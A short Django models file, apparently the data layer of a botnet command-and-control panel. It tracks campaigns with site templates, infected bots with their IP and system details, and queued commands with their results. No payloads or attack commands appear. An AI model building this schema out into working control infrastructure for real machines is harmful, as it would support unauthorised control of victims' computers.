from django.db import models

class CampainTemplates(models.Model):
    name = models.TextField()
    template_file = models.TextField()

class Campain(models.Model):
    uuid = models.CharField(max_length=64, unique=True)
    name = models.TextField()
    site_template = models.ForeignKey(CampainTemplates, on_delete=models.CASCADE)
    active = models.BooleanField(default=1)
    serverip = models.TextField(blank=True, null=True)
    serverport = models.IntegerField(blank=True, null=True)

class Bot(models.Model):
    uuid = models.CharField(max_length=64, unique=True)
    ip_address = models.GenericIPAddressField()
    system_info = models.TextField()
    client_type = models.TextField(blank=True, null=True)
    last_seen = models.DateTimeField(auto_now=True)
    campain = models.ForeignKey(Campain, on_delete=models.CASCADE, blank=True, null=True)

class Task(models.Model):
    bot = models.ForeignKey(Bot, on_delete=models.CASCADE)
    command = models.TextField()
    args = models.TextField(blank=True, null=True)
    status = models.CharField(max_length=20, default='pending')
    result = models.TextField(blank=True, null=True)
    created_at = models.DateTimeField(auto_now_add=True)
    requested_at = models.DateTimeField(auto_now_add=False, blank=True, null=True)
    completed_at = models.DateTimeField(auto_now_add=False, blank=True, null=True)

class TaskCommands(models.Model):
    name = models.TextField()
    command = models.TextField()
    args = models.TextField(blank=True, null=True)
    operating_system = models.TextField(blank=True, null=True)
